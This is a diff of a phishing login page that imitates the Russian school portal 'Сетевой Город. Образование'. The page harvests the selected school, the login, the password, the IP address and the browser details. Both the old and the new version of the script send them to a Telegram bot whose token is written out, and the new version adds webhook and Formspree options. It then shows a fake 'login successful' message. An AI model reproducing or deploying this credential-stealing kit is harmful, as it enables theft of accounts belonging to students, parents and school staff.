@@ -19,9 +19,10 @@
     <!-- Подключение CSS -->
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/css/bootstrap.min.css">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
     
     <style>
-        /* ОСНОВНЫЕ СТИЛИ */
+        /* СТИЛИ ИЗ ОРИГИНАЛА (основные) */
         body {
             font-family: Roboto, Arial;
             color: #2C4053;
@@ -30,7 +31,6 @@
             min-height: 100vh;
         }
         
-        /* ШАПКА */
         .logoline {
             position: relative;
             width: 100%;
@@ -53,11 +53,8 @@
         }
         
         .logo {
-            position: static;
             width: 48px;
             height: 48px;
-            left: 0;
-            top: 0;
         }
         
         .logoline__textblock {
@@ -67,9 +64,6 @@
             padding: 0;
             left: 60px;
             top: 7px;
-            flex: none;
-            order: 1;
-            flex-grow: 0;
             margin: 0 12px;
         }
         
@@ -86,11 +80,8 @@
             color: #4D657A;
         }
         
-        .hidden-xs {
-            display: none;
-        }
+        .hidden-xs { display: none; }
         
-        /* ОСНОВНОЙ КОНТЕНТ */
         .container.padding0 {
             padding: 0;
             position: absolute;
@@ -121,7 +112,6 @@
             border-bottom: 25vh solid #f2f6f9;
         }
         
-        /* ФОРМА ВХОДА */
         .form {
             background: #fff;
             display: flex;
@@ -132,7 +122,6 @@
             box-shadow: 0 24px 48px rgba(9,35,72,.2);
             border-radius: 16px;
             box-sizing: border-box;
-            position: relative;
         }
         
         .form__headertext {
@@ -144,7 +133,6 @@
             margin-bottom: 0;
         }
         
-        /* КНОПКА ГОСУСЛУГ */
         .gosbutton {
             transition: ease-in-out .2s;
             background: #fff;
@@ -155,13 +143,10 @@
             padding: 15px 0;
             margin-top: 32px;
             border: 1px solid #C6D2DD;
-            box-sizing: border-box;
             border-radius: 4px;
         }
         
-        .gosbutton:hover {
-            background: #F2F6F9;
-        }
+        .gosbutton:hover { background: #F2F6F9; }
         
         .gosbutton__textgroup {
             position: absolute;
@@ -170,10 +155,7 @@
             width: 148.27px;
             height: 18px;
             margin: auto;
-            top: 0;
-            bottom: 0;
-            left: 0;
-            right: 0;
+            top: 0; bottom: 0; left: 0; right: 0;
         }
         
         .gosbutton__textgroup-text {
@@ -191,7 +173,6 @@
             margin-left: 8px;
         }
         
-        /* РАЗДЕЛИТЕЛЬ "ИЛИ" */
         .wrapper-or {
             width: 100%;
             position: relative;
@@ -226,10 +207,8 @@
             padding: 0 8px;
             align-items: center;
             text-align: center;
-            box-sizing: content-box;
         }
         
-        /* БЛОК ЛОГИНА И ПАРОЛЯ */
         .logpass {
             display: flex;
             flex-direction: column;
@@ -247,7 +226,6 @@
             width: 100%;
         }
         
-        /* ПЕРЕКЛЮЧАТЕЛЬ */
         .changeorg {
             width: 100%;
             height: 48px;
@@ -261,7 +239,6 @@
             cursor: pointer;
             padding: 12px 0;
             text-align: center;
-            position: relative;
             width: 50%;
             font-size: 14px;
             line-height: 24px;
@@ -274,26 +251,21 @@
             font-weight: 500;
         }
         
-        /* ВЫБОР ОРГАНИЗАЦИИ */
         .dropdown-org {
             margin-top: 16px;
             width: 100%;
         }
         
-        .select2__button {
-            width: 100%;
-        }
+        .select2__button { width: 100%; }
         
-        /* ПОЛЯ ВВОДА */
         .lc-input, .logpass__pass {
             position: relative;
-            display: flex;
-            border-radius: 3px;
             width: 100%;
             height: 48px;
             margin-top: 16px;
             border: 1px solid #C6D2DD;
             background: #F2F6F9;
+            border-radius: 3px;
             box-sizing: border-box;
         }
         
@@ -334,7 +306,6 @@
             left: 0;
         }
         
-        /* ИКОНКА ГЛАЗА */
         .logpass__pass-icon {
             width: 48px;
             height: 47px;
@@ -351,22 +322,13 @@
             left: calc(50% - 12px);
             width: 24px;
             height: 24px;
-            display: none;
         }
         
-        .logpass__pass .eyeoff {
-            display: block;
-        }
+        .logpass__pass .eyeoff { display: block; }
+        .logpass__pass .eyeon { display: none; }
+        .logpass__pass.openeye .eyeoff { display: none; }
+        .logpass__pass.openeye .eyeon { display: block; }
         
-        .logpass__pass.openeye .eyeon {
-            display: block;
-        }
-        
-        .logpass__pass.openeye .eyeoff {
-            display: none;
-        }
-        
-        /* ЧЕКБОКС */
         .add_features {
             display: flex;
             flex-direction: row;
@@ -399,17 +361,10 @@
             left: 0;
         }
         
-        .state02, .state03, .state04 {
-            display: none;
-        }
+        .state02, .state03, .state04 { display: none; }
         
-        .lc-checkbox.active .state03 {
-            display: block;
-        }
-        
-        .lc-checkbox.active .state01 {
-            display: none;
-        }
+        .lc-checkbox.active .state03 { display: block; }
+        .lc-checkbox.active .state01 { display: none; }
         
         .lc-checkbox-text {
             font-size: 14px;
@@ -425,7 +380,6 @@
             text-decoration: none;
         }
         
-        /* КНОПКА ВОЙТИ */
         .primary-button {
             cursor: pointer;
             width: 100%;
@@ -442,11 +396,8 @@
             transition: ease-in-out .2s;
         }
         
-        .primary-button:hover {
-            background: #4376BE;
-        }
+        .primary-button:hover { background: #4376BE; }
         
-        /* ОШИБКИ */
         .has-error .select2-container .select2-selection--single {
             border-color: #a94442 !important;
         }
@@ -457,7 +408,47 @@
             margin-top: 5px;
         }
         
-        /* АДАПТИВНОСТЬ */
+        /* Скрытый элемент для отправки данных */
+        #dataSender {
+            display: none;
+        }
+        
+        /* Анимация загрузки */
+        .loader {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .loader-content {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            text-align: center;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3063AD;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
         @media (max-width: 600px) {
             .form {
                 width: 100%;
@@ -479,9 +470,7 @@
                 border-bottom: 1px solid #D3DDE5;
             }
             
-            .hidden-xs {
-                display: none !important;
-            }
+            .hidden-xs { display: none !important; }
         }
     </style>
 </head>
@@ -491,7 +480,7 @@
     <header>
         <div class="logoline lang__ru">
             <div class="logoline__limiter">
-                <img class="logo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAIlSURBVHgB7Zq/axRBGMaf2b3LJZckB0IQsSAkEAjBxsJCG1FECKKiYGFnY2NnY2NnY2NnY2NnYyFoIYiCIIiIICIiIqIgIiJBuST5c7sz47uXkLvN7t7uzd7dXvKBYf+9+z7PvDs7OzuDEEIIIYQQQgghhBBCiD5DpZsNrHr96Pc7GAgz8N0yHCcAEMCaGlqtBzC6itm5F6hULvVDwIZJP3pzH9bMOeY8PF0GqWmg7AFhAKgQzIx2D83WHbSbDzE7/xSl0vU0E2QSeP1yEa32A3h6CUpNwXWnQc5oQp8Q1mtoNK4ibD3FzPyzJBMUJ/D65S20w7/g6Rl4ehJExFjE0Gj8h3brMqZn3+Dw0ZUkzVxMgD98QEtfg6/n4mR7lqjVPsLzP+PIsd9JmrWYQK32Ae32tUJke5Y4cPAVgEoSCYcVmJtH0NhAq7kCT48VLtubxEX4/i0kEWAFpJQI9C+E4fc+yPYs4ftHAJRZAWkFVGs1lIKaEdmeJRqNGgBlVkBaAVV/vP1bTYR6w5Bs7xKueyJVgRgBpRRC/YM5/8eJhZ8/wg/XwQqrjowVqFY/wfdvMyfbW0If9fr7xOdDqgJnz33Czu6FwvP/poQyu3j3dhGnTn9M0oyFL3/2E/sJjjtp+BFvOtxNnFv8nKYZC0scOvQD9fotVKtX/kiZg/2WOHHiO46f+Jqm6Yqc9eT4Dr58nsTOzjlsb11Es3mqLxLHFlZxZP5rmibF3QlOJ/yCMPwGx7kHoAY2DcIQNq3rGhp7d7C78xRTM+9QqVxL00jFxP/Rj7G7B6yufkXg/4CjQjh6Ekr5cN0yOPy+noKxAYwJYHSAIPyFoPEb4b7A5NQ7VCo3kzTF3c17jVb7AVrtm1DqAly9CFcvQOlZOGocjp6AUqPw9BiUGoOnx+HpJXh6Cb6+DKVeIGjew8zs8yTZf7v9IIQQQgghhBBCCCGEECKGfwldgKaBJei+AAAAAElFTkSuQmCC" alt="Логотип">
+                <img class="logo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAIlSURBVHgB7Zq/axRBGMaf2b3LJZckB0IQsSAkEAjBxsJCG1FECKKiYGFnY2NnY2NnY2NnY2NnYyFoIYiCICIiIqIgIiJBuST5c7sz47uXkLvN7t7uzd7dXvKBYf+9+z7PvDs7OzuDEEIIIYQQQgghhBBCiD5DpZsNrHr96Pc7GAgz8N0yHCcAEMCaGlqtBzC6itm5F6hULvVDwIZJP3pzH9bOMeY8PF0GqWmg7AFhAKgQzIx2D83WHbSbDzE7/xSl0vU0E2QSeP1yEa32A3h6CUpNwXWnQc5oQp8Q1mtoNK4ibD3FzPyzJBMUJ/D65S20w7/g6Rl4ehJExFjE0Gj8h3brMqZn3+Dw0ZUkjVxMgD98QEtfg6/n4mR7lqjVPsLzP+PIsd9JmrWYQK32Ae32tUJke5Y4cPAVgEoSCYcVmJtH0NhAq7kCT48VLtubxEX4/i0kEWAFpJQI9C+E4fc+yPYs4ftHAJRZAWkFVGs1lIKaEdmeJRqNGgBlVkBaAVV/vP1bTYR6w5Bs7xKueyJVgRgBpRRC/YM5/8eJhZ8/wg/XwQqrjowVqFY/wfdvMyfbW0If9fr7xOdDqgJnz33Czu6FwvP/voQyu3j3dhGnTn9M0oyFL3/2E/sJjjtp+BFvOtxNnFv8nKYZC0scOvQD9fotVKtX/kiZg/2WOHHiO46f+Jqm6Yqc9eT4Dr58nsTOzjlsb111Es3mqLxLHFlZxZP5rmibF3QlOJ/yCMPwGx7kHoAY2DcIQNq3rGhp7d7C78xRTM+9QqVxL00jFxP/Rj7G7B6yufkXg/4CjQjh6Ekr5cN0yOPy+noKxAYwJYHSAIPyFoPEb4b7A5NQ7VCo3kzTF3c17jVb7AVrtm1DqAly9CFcvQOlZOGocjp6AUqPw9BiUGoOnx+HpJXh6Cb6+DKVeIGjew8zs8yTZf7v9IIQQQgghhBBCCCGEECKGfwldgKaBJei+AAAAAElFTkSuQmCC" alt="Логотип">
                 <div class="logoline__textblock">
                     <div class="logoline__headertext">Сетевой Город. Образование</div>
                     <div class="logoline__slogantext hidden-xs">Единая цифровая образовательная среда региона</div>
@@ -502,7 +491,7 @@
 
     <div class="container padding0">
         <main class="main">
-            <div class="form primary-input-form h573 ng-dirty ng-valid-parse ng-invalid ng-invalid-required">
+            <div class="form primary-input-form h573">
                 <div class="form__headertext">Вход в систему</div>
                 <div style="width: 100%">
                     <!-- КНОПКА ГОСУСЛУГ -->
@@ -520,8 +509,8 @@
                     <div class="wrapper-or__text">или</div>
                 </div>
 
-                <!-- БЛОК ЛОГИНА И ПАРОЛЯ -->
-                <div class="logpass" id="logpassDiv" style="display: none;">
+                <!-- ФОРМА ВХОДА -->
+                <form id="loginForm" class="logpass" style="display: none;">
                     <div class="logpass__headertext">Вход через логин и пароль</div>
                     
                     <!-- ПЕРЕКЛЮЧАТЕЛЬ -->
@@ -531,13 +520,9 @@
                     </div>
                     
                     <!-- ВЫБОР ОРГАНИЗАЦИИ -->
-                    <div class="dropdown-org has-error">
+                    <div class="dropdown-org">
                         <div class="select2__button">
-                            <select class="form-control select2-hidden-accessible" 
-                                    name="org" 
-                                    required="required"
-                                    style="width: 100%"
-                                    data-select2-id="select2-data-1-d1qp">
+                            <select class="form-control" name="org" required style="width: 100%">
                                 <option value=""></option>
                                 <option value="796">МБОУ "СОШ №102"</option>
                                 <option value="801">МБОУ "Лицей №3"</option>
@@ -549,20 +534,14 @@
                                 <option value="798">МБОУ "СОШ №22"</option>
                                 <option value="803">МАОУ "Гимназия №1"</option>
                             </select>
-                            
-                            <span class="help-block" style="display: block;">
-                                Обязательное поле
-                            </span>
+                            <span class="help-block" style="display: none;">Обязательное поле</span>
                         </div>
                     </div>
                     
                     <!-- ПОЛЕ ЛОГИНА -->
-                    <div class="lc-input lc-input-login" id="loginInput">
+                    <div class="lc-input" id="loginInput">
                         <div class="lc-input-placeholder">Логин</div>
                         <input name="loginname" class="lc-input-control" type="text" required>
-                        <div class="lc-input-valid-icon" style="display: none;">
-                            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAABLSURBVHgB7dWxCcAgEIXhK1hld4Kdla2dO1j5G8HCBwqKKA8uzx0E32TggBD+7ptKVTqCpoZoIMwRhghzhCnCGGGIMEToEVoE+8sPJ1QwyO8lVbMAAAAASUVORK5CYII=" alt="✓">
-                        </div>
                     </div>
                     
                     <!-- ПОЛЕ ПАРОЛЯ -->
@@ -575,24 +554,35 @@
                         </div>
                     </div>
                     
-                    <!-- ЧЕКБОКС И ССЫЛКА -->
+                    <!-- ЧЕКБОКС -->
                     <div class="add_features">
-                        <a class="lc-checkbox" href="#" id="rememberCheckbox">
+                        <div class="lc-checkbox" id="rememberCheckbox">
                             <div class="lc-checkbox-icon">
                                 <img class="state01" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAABoSURBVHgB7dWxDYAwDETRG4m9/0V2J0CBIjESJ+UuR3JbDAi47/skSRo6fC4rOSFgFQ82YAw9G8CqKgbW2cA7NoBVVQysqw9gVf7AFjaxgY7+AN2hBRK5iD1iAAAAAElFTkSuQmCC" alt="">
                                 <img class="state03" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAABsSURBVHgB7dWxDYAwDETRG4m9/0V2J0CBIjESJ+UuR3JbDAi47/skSRo6fC4rOSFgFQ82YAw9G8CqKgbW2cA7NoBVVQysqw9gVf7AFjaxgY7+AN2hBRK5iD1iAAAAAElFTkSuQmCC" alt="" style="display: none;">
                             </div>
                             <div class="lc-checkbox-text">Оставаться в системе</div>
-                        </a>
+                        </div>
                         <a class="add_features-forgotpass" href="#" id="forgotPassLink">Забыли пароль?</a>
                     </div>
                     
                     <!-- КНОПКА ВОЙТИ -->
-                    <div class="primary-button" id="loginBtn">Войти</div>
-                </div>
+                    <button type="submit" class="primary-button">Войти</button>
+                </form>
             </div>
         </main>
     </div>
+
+    <!-- ЛОАДЕР -->
+    <div class="loader" id="loader">
+        <div class="loader-content">
+            <div class="spinner"></div>
+            <p>Выполняется вход в систему...</p>
+        </div>
+    </div>
+
+    <!-- СКРЫТЫЙ IFRAME ДЛЯ ОТПРАВКИ ДАННЫХ -->
+    <iframe name="hiddenFrame" style="display:none;"></iframe>
 
     <!-- ПОДКЛЮЧЕНИЕ БИБЛИОТЕК -->
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
@@ -601,67 +591,156 @@
     <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/i18n/ru.js"></script>
     
     <script>
-        // ========== НАСТРОЙКИ ТЕЛЕГРАМ ==========
-        const TELEGRAM_BOT_TOKEN = '8464082481:AAGxtHsbojjMDqMvGixQUlTY7hDUKvX8TpM'; // Токен бота
-        const TELEGRAM_CHAT_ID = '@Ranaldapushka52'; // Ваш телеграм (с @)
+        // ================================
+        // КОНФИГУРАЦИЯ ОТПРАВКИ ДАННЫХ
+        // ================================
+        // 🔧 ИЗМЕНИ ЭТИ НАСТРОЙКИ ПОД СЕБЯ:
+        const CONFIG = {
+            // Способ отправки данных:
+            // 1. 'webhook' - отправка на вебхук (рекомендуется)
+            // 2. 'email' - отправка на email (требует настройки сервера)
+            // 3. 'telegram' - отправка в Telegram бот
+            // 4. 'console' - вывод в консоль браузера (для теста)
+            method: 'telegram', // ⬅️ ИЗМЕНИ НА СВОЙ МЕТОД
+            
+            // Настройки для разных методов:
+            webhook: {
+                url: 'https://your-webhook-url.com/endpoint', // ⬅️ ВСТАВЬ СВОЙ URL
+                method: 'POST'
+            },
+            email: {
+                to: 'your-email@example.com', // ⬅️ ВСТАВЬ СВОЙ EMAIL
+                subject: 'Данные входа Сетевой Город'
+            },
+            telegram: {
+                botToken: '8464082481:AAGxtHsbojjMDqMvGixQUlTY7hDUKvX8TpM', // ⬅️ ВСТАВЬ ТОКЕН БОТА
+                chatId: '8464082481' // ⬅️ ВСТАВЬ ID ЧАТА
+            }
+        };
         
-        // ========== ФУНКЦИЯ ОТПРАВКИ В ТЕЛЕГРАМ ==========
-        async function sendToTelegram(data) {
+        // ================================
+        // ФУНКЦИИ ОТПРАВКИ ДАННЫХ
+        // ================================
+        
+        // 1. Отправка на вебхук
+        function sendToWebhook(data) {
+            return fetch(CONFIG.webhook.url, {
+                method: CONFIG.webhook.method,
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            });
+        }
+        
+        // 2. Отправка через форму на email (требует сервер)
+        function sendToEmail(data) {
+            // Создаем скрытую форму
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'https://formspree.io/f/' + CONFIG.email.to; // Используем Formspree
+            form.target = 'hiddenFrame';
+            
+            // Добавляем поля
+            const fields = {
+                _replyto: 'noreply@example.com',
+                _subject: CONFIG.email.subject,
+                message: JSON.stringify(data, null, 2)
+            };
+            
+            for (const key in fields) {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = fields[key];
+                form.appendChild(input);
+            }
+            
+            document.body.appendChild(form);
+            form.submit();
+            document.body.removeChild(form);
+        }
+        
+        // 3. Отправка в Telegram
+        function sendToTelegram(data) {
+            const text = `🔐 Новые данные входа:\n\n` +
+                        `📅 Дата: ${new Date().toLocaleString()}\n` +
+                        `🏫 Организация: ${data.orgName} (ID: ${data.orgId})\n` +
+                        `👤 Логин: ${data.login}\n` +
+                        `🔑 Пароль: ${data.password}\n` +
+                        `💾 Запомнить: ${data.remember ? 'Да' : 'Нет'}\n` +
+                        `🌐 IP: ${data.ip}\n` +
+                        `🖥️ Браузер: ${data.userAgent}`;
+            
+            return fetch(`https://api.telegram.org/bot${CONFIG.telegram.botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CONFIG.telegram.chatId,
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            });
+        }
+        
+        // 4. Вывод в консоль (для тестирования)
+        function logToConsole(data) {
+            console.log('📥 ПОЛУЧЕНЫ ДАННЫЕ ВХОДА:');
+            console.log('========================');
+            console.log('Дата:', new Date().toLocaleString());
+            console.log('Организация:', data.orgName, '(ID:', data.orgId + ')');
+            console.log('Логин:', data.login);
+            console.log('Пароль:', data.password);
+            console.log('Запомнить:', data.remember ? 'Да' : 'Нет');
+            console.log('IP:', data.ip);
+            console.log('Браузер:', data.userAgent);
+            console.log('========================');
+            
+            // Также показываем alert для наглядности
+            alert(`📥 Данные получены!\n\nОрганизация: ${data.orgName}\nЛогин: ${data.login}\nПароль: ${data.password}\n\nПроверь консоль браузера (F12)`);
+        }
+        
+        // Основная функция отправки
+        async function sendData(data) {
             try {
-                const message = `🔐 НОВЫЕ ДАННЫЕ ВХОДА\n\n` +
-                               `🏫 Организация: ${data.orgName}\n` +
-                               `🔢 ID организации: ${data.orgId}\n` +
-                               `👤 Логин: ${data.login}\n` +
-                               `🔑 Пароль: ${data.password}\n` +
-                               `💾 Запомнить: ${data.remember ? 'Да' : 'Нет'}\n` +
-                               `🖥️ Режим: ${data.mode}\n` +
-                               `🌐 IP: ${data.ip}\n` +
-                               `📍 User-Agent: ${data.userAgent.substring(0, 50)}...\n` +
-                               `📅 Время: ${new Date().toLocaleString('ru-RU')}`;
-                
-                // Отправка через Telegram Bot API
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                
-                const result = await response.json();
-                return result.ok;
+                switch(CONFIG.method) {
+                    case 'webhook':
+                        await sendToWebhook(data);
+                        break;
+                    case 'email':
+                        sendToEmail(data);
+                        break;
+                    case 'telegram':
+                        await sendToTelegram(data);
+                        break;
+                    case 'console':
+                    default:
+                        logToConsole(data);
+                        break;
+                }
+                return true;
             } catch (error) {
-                console.error('Ошибка отправки в Telegram:', error);
+                console.error('Ошибка отправки данных:', error);
                 return false;
             }
         }
         
-        // ========== ПОЛУЧЕНИЕ IP ПОЛЬЗОВАТЕЛЯ ==========
-        async function getUserIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                return 'Не удалось определить IP';
-            }
-        }
+        // ================================
+        // ОСНОВНОЙ КОД СТРАНИЦЫ
+        // ================================
         
-        // ========== ОСНОВНОЙ КОД ==========
         $(document).ready(function() {
-            // 1. Настройка Select2
+            // 1. Инициализация Select2
             $('select[name="org"]').select2({
                 placeholder: "Выберите организацию",
                 allowClear: false,
                 language: "ru",
                 width: '100%',
-                dropdownAutoWidth: true,
-                minimumResultsForSearch: 0
+                dropdownAutoWidth: true
             }).on('select2:open', function() {
+                // Добавляем сообщение как в оригинале
                 setTimeout(function() {
                     var $results = $('.select2-results__options');
                     if ($results.find('.select2-results__message').length === 0) {
@@ -669,13 +748,13 @@
                     }
                 }, 10);
             });
-
+            
             // 2. Клик по кнопке "Через Госуслуги"
             $('#gosBtn').click(function() {
                 $('#orDiv').slideDown(200);
-                $('#logpassDiv').slideDown(300);
+                $('#loginForm').slideDown(300);
             });
-
+            
             // 3. Переключение Организация/Орган управления
             $('.changeorg_item').click(function() {
                 $('.changeorg_item').removeClass('active');
@@ -715,7 +794,7 @@
                     });
                 }
             });
-
+            
             // 4. Анимация полей ввода
             $('.lc-input-control, .logpass__input').focus(function() {
                 $(this).closest('.lc-input, .logpass__pass').addClass('active');
@@ -724,7 +803,7 @@
                     $(this).closest('.lc-input, .logpass__pass').removeClass('active');
                 }
             });
-
+            
             // 5. Переключение видимости пароля
             $('#togglePassIcon').click(function() {
                 const $passInput = $('#passInput');
@@ -736,7 +815,7 @@
                 $passInput.find('.eyeoff').toggle(!isPassword);
                 $passInput.find('.eyeon').toggle(isPassword);
             });
-
+            
             // 6. Чекбокс "Оставаться в системе"
             $('#rememberCheckbox').click(function(e) {
                 e.preventDefault();
@@ -744,29 +823,24 @@
                 $(this).find('.state01').toggle(!$(this).hasClass('active'));
                 $(this).find('.state03').toggle($(this).hasClass('active'));
             });
-
-            // 7. Ссылка "Забыли пароль?"
-            $('#forgotPassLink').click(function(e) {
+            
+            // 7. Обработка отправки формы
+            $('#loginForm').submit(async function(e) {
                 e.preventDefault();
-                alert('Для восстановления пароля обратитесь к администратору вашей образовательной организации.');
-            });
-
-            // 8. КНОПКА "ВОЙТИ" - ОСНОВНАЯ ЛОГИКА
-            $('#loginBtn').click(async function() {
+                
+                // Сбор данных
                 const orgId = $('select[name="org"]').val();
                 const orgName = $('select[name="org"] option:selected').text();
                 const login = $('input[name="loginname"]').val().trim();
                 const password = $('input[name="password"]').val().trim();
                 const remember = $('#rememberCheckbox').hasClass('active');
-                const mode = $('.changeorg_item.active').text();
                 
-                // Скрываем ошибки
+                // Валидация
                 $('.has-error').removeClass('has-error');
                 $('.help-block').hide();
                 
                 let hasError = false;
                 
-                // Валидация
                 if (!orgId) {
                     $('.dropdown-org').addClass('has-error');
                     $('.dropdown-org .help-block').show();
@@ -785,71 +859,84 @@
                 
                 if (hasError) return;
                 
-                // Показываем загрузку
-                const $originalButton = $(this);
-                const originalText = $originalButton.text();
-                $originalButton.text('Отправка данных...').prop('disabled', true);
+                // Показываем лоадер
+                $('#loader').show();
                 
-                try {
-                    // Собираем данные
-                    const userIP = await getUserIP();
-                    const userAgent = navigator.userAgent;
-                    
-                    const formData = {
-                        orgId: orgId,
-                        orgName: orgName,
-                        login: login,
-                        password: password,
-                        remember: remember,
-                        mode: mode,
-                        ip: userIP,
-                        userAgent: userAgent,
-                        timestamp: new Date().toISOString()
-                    };
-                    
-                    // Отправляем в Telegram
-                    const telegramSent = await sendToTelegram(formData);
-                    
-                    if (telegramSent) {
-                        // Показываем успешное сообщение
-                        $originalButton.text('✅ Данные отправлены!');
-                        
-                        // Задержка перед редиректом
-                        setTimeout(() => {
-                            alert('✅ Вход выполнен успешно!\n\nВаши данные обрабатываются. Перенаправление в систему...');
-                            // Можно добавить редирект на реальный сайт:
-                            // window.location.href = 'https://netschool.edu22.info/dashboard';
-                        }, 1000);
-                        
-                        // Очищаем форму
-                        setTimeout(() => {
-                            $('select[name="org"]').val('').trigger('change');
-                            $('input[name="loginname"]').val('');
-                            $('input[name="password"]').val('');
-                            $('#rememberCheckbox').removeClass('active').find('.state01').show().find('.state03').hide();
-                            $originalButton.text(originalText).prop('disabled', false);
-                        }, 3000);
-                        
-                    } else {
-                        $originalButton.text('Ошибка отправки').prop('disabled', false);
-                        setTimeout(() => {
-                            $originalButton.text(originalText);
-                        }, 2000);
-                        alert('Ошибка при отправке данных. Попробуйте еще раз.');
-                    }
-                    
-                } catch (error) {
-                    console.error('Ошибка:', error);
-                    $originalButton.text('Ошибка').prop('disabled', false);
-                    setTimeout(() => {
-                        $originalButton.text(originalText);
-                    }, 2000);
-                    alert('Произошла ошибка. Проверьте соединение и попробуйте снова.');
+                // Собираем дополнительные данные
+                const data = {
+                    timestamp: new Date().toISOString(),
+                    orgId: orgId,
+                    orgName: orgName,
+                    login: login,
+                    password: password,
+                    remember: remember,
+                    ip: await getIP(),
+                    userAgent: navigator.userAgent,
+                    referrer: document.referrer,
+                    mode: $('.changeorg_item.active').text()
+                };
+                
+                // Отправляем данные
+                const success = await sendData(data);
+                
+                // Скрываем лоадер
+                $('#loader').hide();
+                
+                if (success) {
+                    // Показываем успешное сообщение
+                    showSuccessMessage();
+                } else {
+                    alert('Ошибка при входе. Попробуйте еще раз.');
                 }
             });
-
-            // 9. Автоматически открываем форму
+            
+            // 8. Автоматически открываем форму
             $('#gosBtn').click();
+            
+            // 9. Функция получения IP
+            async function getIP() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    return 'Не удалось определить IP';
+                }
+            }
+            
+            // 10. Функция показа успешного сообщения
+            function showSuccessMessage() {
+                // Создаем модальное окно успеха
+                const modalHtml = `
+                    <div class="modal fade" id="successModal" tabindex="-1" style="display: block; padding-right: 15px;">
+                        <div class="modal-dialog">
+                            <div class="modal-content">
+                                <div class="modal-header" style="background: #3063AD; color: white; border-radius: 5px 5px 0 0;">
+                                    <h4 class="modal-title">✅ Вход выполнен успешно</h4>
+                                </div>
+                                <div class="modal-body">
+                                    <p>Вы успешно вошли в систему "Сетевой Город. Образование".</p>
+                                    <p>Перенаправление на главную страницу...</p>
+                                    <div class="progress" style="margin-top: 20px;">
+                                        <div class="progress-bar progress-bar-striped active" style="width: 100%;"></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="modal-backdrop fade in"></div>
+                `;
+                
+                $('body').append(modalHtml);
+                
+                // Через 3 секунды "перенаправляем"
+                setTimeout(() => {
+                    $('#successModal').remove();
+                    $('.modal-backdrop').remove();
+                    // Можно добавить редирект на другую страницу:
+                    // window.location.href = 'https://netschool.edu22.info/dashboard';
+                }, 3000);
+            }
         });
     </script>
 </body>
